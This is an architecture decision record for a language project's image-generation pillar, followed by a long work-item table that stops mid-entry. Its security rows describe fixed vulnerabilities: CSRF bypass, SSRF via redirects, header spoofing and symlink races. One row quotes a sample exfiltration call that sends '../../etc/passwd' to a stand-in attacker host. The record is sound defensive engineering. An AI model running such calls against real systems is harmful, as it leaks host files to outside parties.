# ADR-0122: Vision pillar scope — inference-first over open weights, images before video

**Status:** Accepted
**Date:** 2026-09-07
**Naryad:** #209 (R0, research phase)
**Mandate:** owner directive of 2026-09-07 to begin implementation of
`Metalogos_Vision_Pillar_Plan.md`; this ADR formalizes that plan's scope decisions.

## Context

The owner requested a fourth generative capability pillar (images, later video) on top of
the existing `Reflex` pillar (ADR-0114..0121). The September 2026 state of open image
generation is consolidated around one architecture family: DiT/MMDiT backbones trained
with flow matching, distilled to few-step inference (8 NFE is normal, not an optimization).
Training such backbones from scratch is datacenter economics: pretraining corpora at
this scale do not exist in open access, and the best open training data is
non-commercially licensed.

At the same time, `candle` already carries full-pipeline precedents (SD 1.5/2.1, SDXL,
Wuerstchen): the "text encoder to denoiser to VAE decode" cycle in Rust has been walked
by someone. The realistic unit of value for Metalogos is the layer **above** the weights:
inference, adaptation, orchestration — and, as the differentiator, compiler-level
provenance and supply-chain security (ADR-0125).

## Decision

1. **Inference-first, no pretraining.** The pillar runs open checkpoints and may adapt
   them (LoRA-class, phase R7); it never pretrains base models. This mirrors Reflex's
   "real training, real accuracy — at local-machine scale" honesty contract (ADR-0115,
   ADR-0112).
2. **Images before video.** Image generation reaches reproducible quality first
   (phases R1-R6, naryads #210-215); video is a separate research cycle with its own ADR
   (**ADR-0126 reserved**). Video inference in pure Rust on consumer GPUs (3D VAE,
   temporal attention) is a distinct risk class and is not promised in this cycle.
3. **Explicit non-scope: NCII capability targets.** The language whose brand is
   security-by-design with compiler gates cannot ship a pillar whose primary community
   use-case is non-consensual synthetic imagery of real people. This is not enforced by
   prose but by mechanism: policy declarations and provenance gates (ADR-0125) make
   honest use explicit and dishonest use loud.
4. **Feature `vision`, off by default** (precedent: `candle`/ADR-0118), with a dedicated
   CI job (precedent: naryad #200's candle-CI job) and crosscheck exceptions referencing
   this ADR (precedent: n187).
5. **All pillar code lives in `src/vision/`, split from day one** under the existing
   module-size-guard discipline; it must not repeat the `diagrams.rs` god-file history.

## Consequences

- ADR-0123 (wedge choice), ADR-0124 (value/registry design), ADR-0125 (provenance gates)
  carry the technical detail; this ADR holds only scope.
- Reserves ADR numbers 0123-0126 for the Vision block; final numbers fixed in one pass
  with the Voice pillar plan (which reserves 0127+) to avoid parallel-ADR collisions —
  the same collision class as naryads 195-197 vs 200-203.
- Crosscheck exclusions for vision examples will grow in R1 and shrink only when
  examples genuinely pass on both backends, mirroring ADR-0121's staging discipline.

## Naryad map — single source of truth for pillar numbering

Reservation lesson applied: the #195-197 vs #200-203 collision and the
ADR-0121 stage-slot drift (update note there) both happened because the
numbering lived in private plan documents. It now lives here, in the repo.

| Naryad | Phase | Content | Status |
|---|---|---|---|
| #206 | maintenance | test-triage: 44 advisory failures resolved, `test-integration` becomes blocking (PR #219). Real fixes: Eq/Ne rollback operators inverted since #148 (hooks.rs), `!=` missing from `parse_compare_op` (grammar had NEQ, no Rust arm), import_path trim, CARGO_MANIFEST_DIR for std_root. Debt: 47 `#[ignore]` with reasons, paid down by #207/#208 | merged, PR #219 |
| #207 | maintenance | `run_test_server_with_backend_in_dir(source, backend, base_dir)` — a single parameter for both resolution paths (TW: `set_base_dir`, VM: `with_std_root`); wrapper `run_test_server_with_backend` retained. Test outcome: 2 TW tests active (n161 `block3_tw_serves_imported_pattern`, dept `tw_serves_all_dept_branches_correctly`); 5 VM-dependent tests ignored with n207/n208 anchors. **Key finding: the VM cannot call user patterns from route bodies (HTTP 500)** — see #208's correction | merged, PR #221 (plus fix-forward) |
| #208 | maintenance | **Scope corrected based on #207's findings:** root cause is that the VM does not dispatch user patterns from route bodies (HTTP 500, proven by n161 Block 3, verbatim "status 500 != 200") plus divergences in query_param/json_body/respond. Goal: VM route body = TW (naryad_160, 24 tests; n161 Block 3 VM, 3; dept_parity VM, 2; vm_golden, 2; total 31 un-ignore) | merged (PR #252): VM route body = TW — 28 un-ignore verified (n160 23+1 kv re-analyzed, n161 3, dept 2; vm_golden 2 stay — their blockers are match-in-VM and candle-gates, outside the naryad's §3; see the #250 row) |
| #209 | R0 | research (wedge) + ADR-0122..0125 | merged, PR #214 |
| #210 | R1 | scaffolding: feature `vision`, `src/vision/`, Value::Vision + VisionRegistry, SSOT loud-stubs, vision-tests CI job | merged, PR #218 |
| #211 | R2 | text encoder on Reflex blocks (Qwen3 architecture): TextEncoderConfig + TextEncoder::new(seed) + forward mapping to [seq, hidden], RoPE/QK-norm/GQA/causal; `vision` implies `candle`. **Delivered with defects** (found by verification, fixed fix-forward): golden pinning was not done (hashes not pinned), Qwen3-4B config pinning was fabricated (40/8-64-6912-32768 instead of the real 32/8-128-9728-40960), the local PRNG copy diverged from the SSOT contract of `src/nn`, seed-stream overlap. Merged, PR #223 (plus fix-forward); remaining debt moved to #230 |
| #212 | R3 | end-to-end wedge (flow sampler + VAE), first image from .mlog; **Go/No-Go gate**. Code-complete: weights.rs, tokenizer.rs, TextEncoder::from_weights, VAE decoder (tiny golden pinned), ZImageTransformer, FlowMatchEuler sampler. Env-gated tests SKIP loudly when MLOG_VISION_WEIGHTS_DIR is unset — real-weights run and Go/No-Go report at `docs/research/naryad-212-go-no-go.md` (pending actual weights execution). DiT tiny golden pinned in #231 (PR #229). Architecture fidelity fixed in #232 (12 discrepancies with diffusers fixed), PR #230. RoPE/guard/mid-attn/cap pos_ids moved to #233 (PR #231). Mid-attn placement, guard truth-up and doc-sync moved to #234 (PR #232). VAE structure truth-up moved to #235 (PR #233). Generator single-source moved to #236 (PR #234). See PR #227 | merged (code), PR #227; Go/No-Go pending real-weights run; DiT golden chain #231 to #232 to #233 |
| #213 | R4 | `vision { }` declarations, parser, semantic, taint (prompts), dispatch | delivered by #238–#240 (R4 was split loudly into #238 = R4.1 declarations/parser/semantic, PR #236; #240 = R4.2 dispatch + taint, PR #238; #239 = tails fix-forward, PR #237) — truth-up #246 |
| #214 | R5 | security gates (ADR-0125), manifest, LSB watermark, checksum pinning | delivered by #241 (PR #239): `VISION_UNSIGNED_EXPORT` (Error + runtime backstop), `MODEL_WEIGHTS_UNSAFE` (Error), `VISION_POLICY_MISSING` (Warning), `VISION_UNSIGNED_EXPORT_RAW` (Warning), LSB watermark (MLGV), manifest + `.manifest.json` sidecar, SHA-256 checksum pinning, `vision_fetch_weights` (SSRF-guard + allowlist) — truth-up #246 |
| #215 | R6 | vision_edit, LoRA adapters, vision_save/load (SQLite BLOB) | fully delivered by #242-#244 (R6 was split loudly into #242 = save/load, #243 = vision_edit, #244 = LoRA) — truth-up #244 |
| #216 | R7 (optional) | LoRA fine-tuning via candle autograd | reserved (TRAINING is permanently out of R6 scope — #244 loads and applies adapters but does not train) |
| #217-219 | V1-V3 | video phase (after a separate research cycle, ADR-0126 reserved) | reserved |
| #230 | maintenance (Vision R2 hotfix) | golden pinning: PRNG SSOT (replacing the local copy with `crate::nn::attention::generate_uniform_f32`) plus stream hygiene (per-parameter derivation with no overlap), then pinning the GOLDEN_ constants after 3 bit-exact runs (order matters: the PRNG change affects every value); panic-free invariants; re-anchoring the constant test. R3 (#212) starts only after #230 | merged, PR #225 |
| #237 | R3.7 | real-weights run prep: `tools/fetch_vision_weights.sh` (manifest-driven, `curl -L -C -`, reference is the manifest SHA against the HF LFS oid, sha-verified SKIP, POST-DOWNLOAD REFUSAL, `--dry-run`, `--only`); #212's manifest gets a "How to verify against the source" section (HF LFS oid equals SHA-256, a mismatch is a loud refusal) plus layout-size truth-up (actually 16 files totaling 32.85 GB, per the HF API on 2026-09-09) plus 4 tokenizer SHAs filled in with real values; Go/No-Go runbook `naryad-237-real-weights-runbook.md` (preflight needs at least 40 GB disk and 64 GB RAM under the F32 policy, about 62 GB peak; exact commands for the env-gated tests of #212; capturing PNG output, timings, and determinism; Go/No-Go criteria stated verbatim). **Zero source diff by design** (the code was GO-ready after #236); the real-weights run is PARKED until hardware is available (owner decision, 2026-09-09) | merged, PR #235 |
| #238 | R4.1 | `vision { }` declarations, the first slice of R4 "Language" (#213 remains the reserve for the rest of R4: taint, dispatch). Grammar: `vision_decl` added to the registry at level 8, name as a STRING (plan section 3), 7 fields, loud unknown-field and duplicate-field errors that include a position, `vision_ident_val` equals IDENT plus a hyphen to support ADR-0124's `gguf-q4`; AST: VisionDecl plus VisionPolicy{Safe} plus VisionProfile{Fp16,Fp8,GgufQ4}; parser: every field is required (no silent defaults), values outside the enum are parse errors; semantic: `KNOWN_VISION_MODELS` is an SSOT in `src/vision/mod.rs` (not feature-gated, next to VisionRegistry), steps must be at least 1 (anything other than 8 triggers an audit warning), width and height must be multiples of 16 within the range 256 to 4096, and a duplicate name is an error. Block 0 is the fix-forward from #237 (runbook golden `860c85b3`, text encoder 8.05 GB). Dispatch and builtins are NOT touched (that is R4.2); minimal no-op arms appear in compiler, execution, and modules, forced by exhaustive matches (a deviation from the diff invariant, documented in the PR). 12 new tests (6 parser plus 6 semantic); local fmt, clippy, and lib tests are green, integration tests hit the container limit so CI is authoritative | merged, PR #236 |
| #240 | R4.2 | dispatch: `vision { }` flows through the VM into builtins, plus taint integration for prompts. `Program::vision_decls` is modeled on reflex_decls, with fields mapped one to one from the AST via `CompiledVisionDecl::from_ast`; pass one populates it and pass two carries no bytecode; `Vm::load_program` and the interpreter's declaration pass both register the name to its parameters; `vision_registry` lives on the context (a Mutex on the Interpreter, plain on the VM), and the artifact `VisionArtifact` is a PNG buffer (R1's placeholder unit type is removed). `vision_generate(decl, prompt)` takes 2 arguments (arity changed from 3 to 2, a lesson from #234, matching plan section 3's contract): it resolves the declaration by name, re-checks at runtime that the model is one of `KNOWN_VISION_MODELS`, and reads weights from `MLOG_VISION_WEIGHTS_DIR` (a missing environment variable or component produces a loud error — an honest refusal by the environment, not a stub); the wedge pipeline runs tokenizer, then Qwen3-4B, then the Z-Image DiT with flow_match_euler_sample (steps and seed come from the declaration, sigmas equal steps plus one), then the VAE, then PNG encoding (encode_png, shared with save_png), then the registry, producing `Value::Vision(id)`; resolution is fixed at 1024 by 1024 (derived from the DiT config), and any other resolution is a loud error (deferred to R5). `vision_list` returns real handles sorted by id; `vision_export` returns real PNG bytes plus an unsigned-export warning (the real gates arrive in R5); `vision_edit`, `vision_save`, and `vision_load` keep their R6 stubs untouched. Interception points exist in the interpreter (both eval and invoke) and in the VM (modeled on reflex), and the dispatch functions are shared. For taint: UserInput in vision_generate's second argument triggers an audit warning, `VISION_PROMPT_USER_INPUT` (modeled on n201; the first argument, the handle, is not flagged; taint is not introduced on Value::Vision itself). Tests: 13 non-gated tests (naryad_240_vision_dispatch) plus an env-gated .mlog end-to-end test with no #[ignore] (naryad_240_vision_mlog_e2e), which closes the commitment made in #237's Block 3.1; the builtin count of 387, KNOWN_VISION_MODELS, the goldens, and ADR-0124 are all untouched | PR #238 |
| #241 | R5 | security gates (ADR-0125) plus a Provenance MVP: Category A gates include `VISION_UNSIGNED_EXPORT` (an audit error via `audit_category_a` plus a runtime backstop sharing the same check id), `MODEL_WEIGHTS_UNSAFE` (an audit error, reusable in audit.rs and serving as the SSOT for the future Voice pillar), and `VISION_POLICY_MISSING` (an audit warning; the parser relaxes only the policy field per ADR-0125's SSOT, the other 6 fields stay required, and the policy enum itself is untouched), plus a raw-export warning `VISION_UNSIGNED_EXPORT_RAW` (the name was fixed by #241 itself, not by the ADR). For provenance: `vision_generate` always signs its output with an LSB watermark (the bytes MLGV plus a 32-bit model hash, embedded in the RGB least-significant bits) plus a `VisionManifest` (model id, weights SHA or the literal `unpinned`, seed, prompt hash, policy or the literal `unspecified`, timestamp, and the SHA of the final PNG); `vision_export` now returns the PNG plus a `.manifest.json` sidecar file (lifting the unsigned warning that #240 left in place); `vision_export_raw` is an explicit opt-out that returns the bytes as-is with no sidecar. `vision_fetch_weights` gained an SSRF guard (`check_url_ssrf`, which pins DNS resolutions), a default-deny allowlist (`MLOG_VISION_WEIGHTS_ALLOWLIST`), acceptance of manifest.json class sources only, and SHA-256 pinning (reusing WeightsManifest). The builtin registry grew from 387 to 389; there are 4 Category A contract tests, 3 new plus the taint test carried over from #240; the tests use no network and need no real weights | PR #239 |
| #242 | R6.1 | SQLite persistence of artifacts, the first third of R6 (plan section 7.1; R6 was split loudly into three: #242 for save and load, #243 for vision_edit, #244 for LoRA). `src/vision/store.rs` defines a `vision_artifacts` table (name as primary key, png as a BLOB, manifest_json as NULL when the manifest is None, saved_at as an RFC 3339 timestamp; modeled on `init_kv_persist`), with a save, load, and list API backed by tests and loud diagnostics and no separate builtin-level listing layer on top of the database. The manifest round-trips verbatim: `Some(m)` becomes JSON and comes back as an equal `Some(m')` field by field, with the timestamp never regenerated; None becomes NULL and comes back as None; malformed JSON is a loud error, because silently degrading a signed artifact into an unsigned one is forbidden. A name collision is also a loud error, since upsert and delete are out of scope and a silent overwrite would break the provenance chain; the PNG itself is stored only as a BLOB inside the program's own database. `vision_save` and `vision_load` are intercepted in the interpreter (both eval and invoke) and in the VM, carrying state the same way #240 and #241 do, plus a database connection; no database configured produces a loud error hinting at the `db { url: ... }` declaration; the id is a session-scoped handle that is monotonic and not itself persisted, while the real persistent key is the name. Last-resort stubs were brought up to date, modeled on export_raw_stub, with #242 replacing the outdated "214/215"-era R0 naming. The round-trip contract that R6 planned as its acceptance test now holds: PNG plus sidecar match byte-for-byte after a save followed by a load into a fresh registry, and the `VISION_UNSIGNED_EXPORT` backstop still applies after persistence. The registry count stays at 389; editing, the goldens, weights.rs, ADR-0124, and KNOWN_VISION_MODELS are all untouched | PR #240 |
| #243 | R6.2 | vision_edit, in-context editing, the second third of R6 (#244 remains LoRA). **Block 1** introduces `VaeEncoder` (`src/vision/vae.rs`, mirroring the decoder), built from non-decoder prefixes of the very same pinned file `vae/diffusion_pytorch_model.safetensors` (the manifest is not extended; the parameter count of 244 breaks down as 138 for the decoder plus 106 for the encoder, and the quant_conv component is optional — its presence or absence produces a loud note, the actual file list is checked against the header at the still-PARKED real-weights run, and any discrepancy is a loud error listing exactly what differs); a `new_tiny` constructor with its own PRNG slots supports tiny contract tests; `encode(img in the range -1 to 1)` produces a tensor of shape `[1, C, H/f, W/f]` in posterior MODE for determinism (Block 2.3), and the derivation is the algebraic inverse of the decoder direction fixed in #232; `decode_png` is simply the decoding half of encode_png. The in-context edit cycle adds `flow_match_euler_edit` in sampler.rs and `forward_edit` in dit.rs (purely additive): at every step, the reference latent is concatenated as extra tokens alongside the noisy ones, reusing the same x_embedder and noise_refiner, with RoPE time-slots assigning cap_len+1 to the noise (as in ordinary generation) and cap_len+2 to the reference, checked loudly against axes_lens; the euler_step update applies only to the noise branch while the reference stays clean; `EDIT_STEPS` is fixed at 8, the distilled turbo step count, pinned by a loud constant and a pinning test, and there is no classifier-free guidance because this is the turbo variant. **Block 1.3 stays bit-exact**: the wedge goldens from #212 remain green with no edits at all. **Block 2** adds `vision_edit(handle, prompt) -> Vision`: the source image must already be signed, so a manifest of None is a loud error raised before the environment check even runs, though unsigned images remain usable via `vision_export_raw`; the model is re-checked against `KNOWN_VISION_MODELS` using the source's own manifest; the edited artifact inherits the source's model id, policy, and seed, while recording the current run's model SHA-256, the SHA-256 of the edit prompt, and a fresh timestamp and PNG SHA-256 (the artifact is always signed, and the watermark is applied afterward so that the recorded PNG hash describes exactly the bytes that are shipped); the dimension contract from R4.1 still applies (multiples of 16 within 256 to 4096) together with the VAE's own scale factor, both enforced as loud errors, since silent resizing is forbidden; the same environment and feature gates as generate apply here too; interception again happens in both the interpreter and the VM. Last-resort stub naming was truthed up, with #243 being the final naryad to retire the old "214/215" placeholder names, and naryad_210's own count moved from 10 to 11 (one stub test removed, two real-path tests added). **Block 3** adds taint on vision_edit's prompt argument (position 1), reusing the existing `VISION_PROMPT_USER_INPUT` check id and category, while the handle argument at position 0 is never flagged, and no new check ids were introduced. **Block 4** delivers 14 tiny contract tests (naryad_243, covering dependence on the source and prompt, the watermark and all 7 manifest fields, the unsigned-source refusal, the dimension contract, and the EDIT_STEPS pin, modeled on the wedge tests: synthetic, with no network access, no real weights, and no #[ignore]) plus one env-gated end-to-end test, `mlog_vision_edit_export_e2e`, that SKIPs loudly and targets runbook section 3.1; that runbook section now covers the edit end-to-end path; LoRA, #241's security gates, weights.rs, grammar.pest, and the goldens are all out of scope here, and the registry count stays at 389 | PR #241 |
| #244 | R6.3 | LoRA adapters, the final third of R6 "Edit + LoRA": `src/vision/lora.rs` parses safetensors bytes and accepts BOTH canonical name forms (diffusers-PEFT `lora_A/lora_B` and ComfyUI `lora_down/lora_up` plus an optional `<target>.alpha`; rank = the mean pair dimension, scale = alpha/rank with the loud 1.0 default, non-F32 upcast is loud); validation accepts attention projections only (`to_q/to_k/to_v/to_out.0` per `zimage_expected_keys`), and half pairs, non-attention targets, unknown prefixes, orphaned keys and mismatched dimensions are all loud errors with the full problem list; `ZImageTransformer::from_weights_with_lora` builds the base through the untouched `from_weights` and merges `W' = W + scale·(up@down)` in F32 (deterministic target order, missing base / out-of-range n_layers are loud; a zero up OR down leaves the output byte-exact — the #212 wedge goldens stay green untouched); a `vision_lora_adapters` SQLite table is the adapter's ONLY home (ADR-0124 §6, no session state); `vision_lora_load(name, path) -> String` reads the file only inside the weights dir (relative path, no traversal, `.safetensors` only — the prescribed loud check order, path contract in `vision_lora_check_adapter_path`); `vision_lora_generate(decl, prompt, lora_name) -> Vision` resolves the adapter from the database with a sha integrity pin, records the COMPOSITE provenance `model_sha256 = sha256("{base}\nlora:{name}:{sha}")` (honest even over the "unpinned" marker), watermarks with the BASE model and signs ALWAYS; three interception sites, stub лекало, taint on the prompt argument (the same check id). Registry 389→391 — **the vision family reached the ADR-0124 §3 ceiling (10/10): the NEXT vision builtin requires an ADR-0124 edit**. The #212 wedge goldens are bit-exact untouched; weights.rs/grammar.pest/KNOWN_VISION_MODELS/VisionRegistry/ADR-0124/the weights manifest are untouched | PR #244 |
| #251 | maintenance | session-test serialization (maintenance): all 10 `tests/session_memory_contract.rs` tests hold one poison-tolerant static mutex (`test_lock`, template `naryad_244_vision_lora.rs:69` env_lock) for the whole test body — the process-global `SESSION_STORE` race (`src/builtins/memory.rs:219`): a parallel sibling's `reset_session_store()` wipes keys mid-assert (2 CI failures 2026-09-10, `left: 0, right: 1` at :204, `contract_session_no_persistence`; the #239 family, 2nd round). Test-only: no `src/**`, no new deps, no CI changes; `run_mlog`/`session_set_direct` unchanged, asserts verbatim; 30/30 consecutive green runs + a loud same-class scan of `tests/` (findings in PR body: `llm_cache_contract`, `model_routing_contract`, `naryad_126`, `conversation_state_contract`, `naryad_244` blob2 — race candidates for the owner to schedule) | PR #248 |
| #252 | security | write-path symlink TOCTOU closed (planted-final-component escape, issue #255): `sandbox_path_ex` now returns a path that is SAFE TO USE, not merely checked — `ForRead` returns the canonicalized file path (in-sandbox symlink reads still resolve; the sandbox is not a symlink ban), `ForWrite` returns `<canonical parent>/<final component>` with the parent prefix-verified; new `open_sandbox_write` two-phase open closes the final-component race: `create_new` (fresh creation is atomic — no symlink can sit there) → on `AlreadyExists` canonicalize the full path, re-verify the sandbox prefix, reopen the CANONICAL path with `O_NOFOLLOW` (unix; non-unix boundary documented — symlink creation there requires elevated privileges); honest boundary recorded in code: intermediate directory components swapped between canonicalize and open remain out of scope (would need per-component O_NOFOLLOW or Linux openat2 RESOLVE_BENEATH — revisit on a real use case); `http_download` closed by the same helper at the third ForWrite site (its boolean soft-failure contract unchanged: `Ok(false)` on any failure); `write_file`/`append_file` sandbox violations are now LOUD errors («file I/O sandbox: ...») instead of the silent empty string (OS-level write errors keep the soft contract); 7 new tests (`tests_n252`, unix-gated where planted symlinks are the repro'd class; full `write_file`/`append_file` call chains exercised, not just `sandbox_path_ex`); deviations loud in PR #261 | merged, PR #261 |
| #253 | security | exec-gate serve context (Variant A, owner decision 2026-09-11, issue #256): route bodies require `METALOGOS_SERVE_ALLOW_EXEC=1` — replacement semantics, process flag does NOT reach route bodies; SSOT `exec_gate(context)` (collapsed the №97 duplication) + thread-local RAII `ServeRouteExecGuard` inside both spawn_blocking route paths (TW/VM parity); stable code `EXEC_NOT_PERMITTED` (rides in the error text until the mlog-check registry lands — loud); serve banner danger-flag + route-exec state line; process contexts unchanged (№97); `exec_restricted` closure pinned (registry + n88); 8 new tests, `#[ignore]` delta 0; breaking-change CHANGELOG entry | PR #271 |
| #254 | bug | io soft-failure no longer masks sandbox violations: `read_file`/`delete_file` split «missing/unreadable» (soft, contract preserved) from «violation» — loud `[SANDBOX_VIOLATION]` (ADR-0131 text-borne until the diagnostic registry lands); classification `sandbox_path_missing` (textual violations always loud; `symlink_metadata` miss = soft; existing-but-unresolvable incl. broken symlink = loud — №131 rejections now loud); `write_file`/`append_file` carry the code on their №252 loudness; `file_exists`/`list_dir` unchanged (out of scope, decision in PR); REFERENCE io table updated; +8 unit +8 integration tests, `#[ignore]` delta 0 | PR #273 |
| #257 | hygiene (found a real bug) | `url_decode_fallback` pushed bytes as chars — `%D0%B6` → mojibake `Ð¶`: every non-ASCII `query_param()` corrupted for end users; fixed via byte reassembly + lossy UTF-8 (decoding never fails); behavior table pinned by tests — invalid escapes (`%ZZ`/truncated `%`) pass through literally (query parsing never fails on user input), `+` → space (form-urlencoded convention, documented), single-pass decoding, lowercase hex ok; NO new dependency (`percent-encoding` rejected — decoder trivially correct after the fix); REFERENCE §4.13 documents it; +10 tests incl. real-HTTP Cyrillic e2e; fuzz target from №256 left untouched (its ASCII roundtrip stays valid; non-ASCII also holds now — out of §3) | PR #285 |
| #261 | security | SSRF egress pack (`is_blocked_address` SSOT): IPv4-mapped IPv6 unwrapped via `to_ipv4_mapped()` and re-checked through the V4 branch, unspecified 0.0.0.0/:: blocked, CGNAT 100.64.0.0/10 (RFC 6598) and benchmark 198.18.0.0/15 (RFC 2544) via an explicit octet-range helper (std ships no helpers); redirect `Policy::none()` on ALL FOUR egress builtins (http_get/http_post/http_post_multipart/http_download) — the default 30x-following re-resolved DNS per hop without re-pinning (SSRF pin bypass + cross-host Authorization leak), 3xx returned as-is, BREAKING with migration in CHANGELOG, per-hop re-pin recorded as revisit; `http_download` URL through `apply_ssrf_resolves` like the other three (gate refusal LOUD, parity with http_get; network/write failures keep the soft Ok(false) contract, dest-path sandbox stays soft); 11 tests in `tests/naryad_261_ssrf_pack.rs` (exact-range unit table, legacy n130/n150 regression, URL-level gate on a CGNAT literal, local-bind 302 non-following, download loud-without-flag / works-with-flag); audit.rs MODEL_WEIGHTS_UNSAFE message class list synced, threat-model class (1) widened | PR #287 |
| #264 | bug (TW/VM parity) | immutability enforced end-to-end (issue #280, probe: `mlog check` OK → TW loud error → VM silently printed 20): (1) `semantic.rs` — assignment to a non-mut variable is now a compile-time error with the TW's exact text («cannot assign to immutable variable: x (use 'let mut x' to make it mutable)»), so `mlog check` catches it before either backend runs; (2) `compiler.rs` — non-mut assignment refuses to compile (an .mbc with the violation can no longer be produced); (3) new `StoreAssignLocal {slot, name, mutable}` instruction — the compiler's immutability fact rides as metadata, appended at the END of the enum (backward-compatible wire order, .mbc format unbroken); the compiler only ever emits `mutable: true`, so `false` on the wire means bytecode produced past the check — the VM fails LOUDLY with the TW-parity text instead of the pre-№264 silent overwrite (plain `let` bindings keep using `StoreLocal` — definitions, not assignments); (4) `let mut` path unchanged end-to-end (negative control). Tests: 10 in `tests/naryad_264_immutability.rs` (probe flip: check errors / TW-VM parity / .mbc backstop loud / mut path green); corpus examples green; 628 lib tests green; CHANGELOG Fixed; README/REFERENCE truth-up | PR #289 |
| #262 | security | CSRF strict (issue #278): `check_csrf` accepted a token the server NEVER issued — a matching `_mlog_csrf` cookie + `X-CSRF-Token` header pair with no entry in `csrf_tokens` passed via an explicit stateless fallback (`.unwrap_or(false)` on the TTL lookup, «stateless double-submit client» comment) — the classic naive double-submit bypass (attacker plants a cookie, sends any matching header). Fallback REMOVED: the token must have been issued by this process, absence → 403 «CSRF token validation failed» + audit entry (a server restart is an honest 403 — the page reloads and gets a fresh token); the dead half of the `(session_id, Instant)` tuple now WORKS: the request identity is computed exactly as at issuance (HMAC-verified `_mlog_session` raw id via `verify_cookie`; `""` = sessionless), mismatch → 403 «CSRF session binding mismatch» + audit entry; honest boundaries pinned by tests — a sessionless-bound token is valid only without a session (a bad-HMAC session cookie counts as sessionless — the same treatment it gets everywhere else in the pipeline), and binding proves WHO owns the token, not whether the session is alive (session-liveness stays with the middleware step that runs right after); TTL 15 min (№29 §2.2) and the №125 no-HttpOnly issuance mechanics untouched. Tests: +6 unit in `src/server.rs` (test_74 лекало: unissued pair/match/foreign session/absence/sessionless-replay/expired) + 5 HTTP in `tests/naryad_262_csrf_strict.rs` (forged pair → 403 — the pre-№262 200 regression; issued → 200; other-instance token → 403, restart simulation; sessionless token + valid signed foreign session → 403 with negative control; sessionless token + garbage session cookie → 200, the documented boundary); REFERENCE §5.6 documents the csrf middleware (README has no middleware section — loud) | PR #291 |
| #263 | security | rate-limit keyed by connection peer + bounded state maps (issue #279): `extract_client_ip` trusted spoofable XFF unconditionally — header rotation = fresh bucket every request; now the key is the peer address (`ConnectInfo` wired via `into_make_service_with_connect_info`), XFF/X-Real-IP honored only with `METALOGOS_TRUSTED_PROXIES` (exact IPs / /NN CIDR, no new deps — octet technique from №261; leftmost entry from a trusted direct peer, semantics loud in REFERENCE §5.6); `rate_limit: N` server-declaration field (grammar+parser+AST, default 100 unchanged) replaces the hardcoded call argument; state maps bounded — MAX_SESSIONS 10 000, MAX_CSRF_TOKENS 10 000, MAX_RATE_KEYS 65 536, cap → loud refusal (429/503) instead of unbounded growth; csrf-sweep extended to stale rate buckets + expired sessions (per-server TTL constant — revisit); 5 HTTP tests (429 on 101st same-peer request, XFF ignored/accepted, cap loud, sweep); breaking for proxied deployments without the variable | PR #TBD |
| #260 | security (exfiltration primitive closed) | `http_post_multipart` read every file field with `std::fs::read(path)` on the RAW path — the only builtin file read outside the sandbox (read_file/delete_file/http_download all go through it; issue #276): any route/template that let an untrusted string reach the third argument became an exfiltration primitive (`http_post_multipart("https://evil.example", {}, {"f": "../../etc/passwd"})` sent an arbitrary host file to the program's URL; the URL itself was SSRF-gated since №130 — the files it carried were not). Fix: every file path resolved through `sandbox_path_ex(path, SandboxMode::ForRead)` (SSOT io.rs) BEFORE the client is built (fail-fast — a violation never touches the network); violation = loud `http_post_multipart(): [SANDBOX_VIOLATION] file I/O sandbox: ...` (№252/№254 convention, text-borne until the diagnostic registry lands); in-sandbox relative paths keep working and the read uses the canonical path (№252); missing file stays an error (now loud `cannot resolve path`). Tests: 4 in `tests/naryad_260_multipart_sandbox.rs` (traversal loud, absolute loud, unix symlink-escape loud, in-sandbox file really sent to a local bind with `METALOGOS_HTTP_ALLOW_PRIVATE=1` under the env_lock). Deviations loud (§8.4): docs went to REFERENCE (README has no http-builtins section), CHANGELOG entry added, negative tests target the public literal 8.8.8.8 so loudness is independent of the SSRF flag | PR #286 |
| #255 | hardening | explicit request body limit: `REQUEST_BODY_LIMIT_BYTES = 2 MiB` applied via `DefaultBodyLimit::max` in `build_router` (was: axum 0.8 implicit ~2 MB default — source of truth in a foreign crate, silent on upgrade; threat-model/REFERENCE had no answer to "max request size"); N+1 bytes → 413, N−1 → 200 (real-HTTP test); number documented in threat-model + REFERENCE §4.13 | PR #283 |
| #256 | robustness | fuzz coverage for external-bytes paths (part A): `fuzz_target_bytecode` — `Program::deserialize` never panics/hangs (dispatch run out of scope: VM has no step-budget API, loud §8.4); `fuzz_target_url_decode` — panic freedom + ASCII roundtrip (non-ASCII roundtrip = mojibake, deferred to №257 loudly); `url_decode_fallback` → pub; fuzz/Cargo.lock committed; PART B (fuzz-smoke CI job, nightly+cargo-fuzz, 120s/target, non-blocking by design) needs the owner — session token lacks the workflow scope, ready block in PR #284; issue #259 stays open until green | PR #284 |
| #248 | maintenance | LLM request cancellation — deadline-based TCP drop on all call paths (n156 mechanism extended to the legacy backend; abandoned-thread wrapper removed); README/REFERENCE caveat truth-up. `LlmBackend::call_with_deadline` (default → `call_with_model`): RealLlm — one-shot client at min(deadline, 120s), real TCP drop, no retry loop inside a deadline; MockLlm — sleeps min(delay, deadline), loud timeout Err (honestly documented as test-only simulation); learnable.rs legacy `Some(timeout)` calls it directly (the №126 `thread::spawn` + `recv_timeout` wrapper and its Disconnected arm are gone; 'timed out' wording preserved for n126). SmartRouter (n156) unchanged. Proven by an in-process accept-and-hang server test (127.0.0.1:0) whose server side observes the client TCP close at the deadline — request cancelled, not the wait; 4 tests, 0 `#[ignore]`; n126 4/4 green with zero test edits; README:113/REFERENCE §5.15 rewritten, the `AbortHandle` promise withdrawn as fulfilled, external on-demand abort recorded as a revisit condition | PR #251 |
| #247 | maintenance | adapt quality mock (ADR-0112) — revisit point formally recorded after the external audit; docs-only, mock value untouched | PR #250 |
| #250 | maintenance | VM route body = TW (#208's debt, closed): FOUR stacked roots behind the n206 ignores, each repro'd then fixed — (1) the serve path's `Vm::new` + `load_program` + `execute_route_code` never registered patterns (only `RegisterPattern` instructions executed during main_code did), so every route-body `CallPattern` hit "pattern index N not found" → 500; fix: `load_program` pre-registers patterns by scanning main_code (index order 1:1, old-.mbc safe) + an index-stable (rposition replace-in-place) `RegisterPattern` handler; (2) templates never reached `GLOBAL_TEMPLATES` on the VM path ("unknown template 'Greeting'"); fix: compiler pass2 registers via the n115 channel (overwrite-idempotent; Program schema frozen; .mbc-templates residual loud); (3) route bodies ended with `Pop` (ExprStmt) and no `Return`, so the fall-through returned a leftover LOCAL ("hi" instead of the HttpResponse); fix: final-Pop suppression — body value = last statement's value, TW semantics; (4) bool literals compiled to `Float(1.0/0.0)` (sort divergence [1,3,a] vs [3,a,true]); fix: `Const(Value::Bool)` (.mbc format unchanged); plus the designed 404 body ("404 Not Found") was never wired into the axum router — a backend-agnostic `.fallback` added (parity kept). Un-ignore 